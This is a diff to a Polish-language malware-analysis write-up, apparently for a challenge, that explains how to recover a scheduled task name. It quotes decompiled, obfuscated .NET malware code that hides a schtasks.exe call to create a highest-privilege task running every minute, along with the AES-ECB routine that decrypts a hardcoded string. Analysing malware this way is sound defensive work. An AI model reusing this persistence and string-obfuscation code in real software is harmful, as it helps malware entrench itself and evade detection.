@@ -57,8 +57,15 @@ What is the name of the scheduled task created by the malware to achieve executi
 </details>
 
 ```
-No tutaj żeby zacząc odpowiadać zaczyna sie juz poważna praca do wykonania... Klasa którą analizowaliśmy w Q3 pełna jest zaobfuskowanych metod, funkcji etc. I tak żeby poznać nazwę pliku:
-    {
+No tutaj żeby zacząc odpowiadać zaczyna sie juz poważna praca do wykonania... Klasa którą analizowaliśmy w Q3 pełna jest zaobfuskowanych metod, funkcji etc. I tak żeby poznać nazwę pliku która jest zahardkodowanym stringiem który trzeba odszyfrować:
+
+public static string EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu = "sJHKF5x7kjxy85oLMym05A==";
+który znajduje się w klasie poniżej
+[...]    
+ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks.exe");
+				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				if (Conversions.ToBoolean(MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.9wp6DW38pEGrxGQEOQkzV4F6DVSJViAZDNdsO9gtbzZBQrydyvd059AgNPuLYcnNJjNwBFhzo8yNTC1aOPH4fLXTZlHK()))
+				{
 					processStartInfo.Arguments = string.Concat(new string[]
 					{
 						"/create /f /RL HIGHEST /sc minute /mo 1 /tn \"",
@@ -68,8 +75,32 @@ No tutaj żeby zacząc odpowiadać zaczyna sie juz poważna praca do wykonania..
 						"\""
 					});
 				}
+[...]
+odszyforwanie naszego string wykouje się tu:
+NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu = Conversions.ToString(yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu));
 
+przy użyciu klasy:
 yEA8oSg5e02FNWc6DpGE
+
+jej logika:
+
+public class yEA8oSg5e02FNWc6DpGE
+	{
+		// Token: 0x0600013B RID: 315 RVA: 0x000069B8 File Offset: 0x00004BB8
+		public static object f5Mo9y1FK1yJy4poW9CE(string 3pXqYfeWgCBZOAYUjYnh)
+		{
+			RijndaelManaged rijndaelManaged = new RijndaelManaged();
+			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
+			byte[] array = new byte[32];
+			byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(ACX0qTJzEzq40qP5qFxb.wVkaAAeCf6BeWi8Flwtq(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.DhMybcleyUJ8bZbaqtAkL3FTz6SQ840xELBsFWt9yekNCVYQ1WgRtjL1bTF3));
+			Array.Copy(sourceArray, 0, array, 0, 16);
+			Array.Copy(sourceArray, 0, array, 15, 16);
+			rijndaelManaged.Key = array;
+			rijndaelManaged.Mode = CipherMode.ECB;
+			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
+			byte[] array2 = Convert.FromBase64String(3pXqYfeWgCBZOAYUjYnh);
+			return ACX0qTJzEzq40qP5qFxb.sJljw7gGxcYB8jRe1fPv(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
+		}
 ```
 
 #### Q5
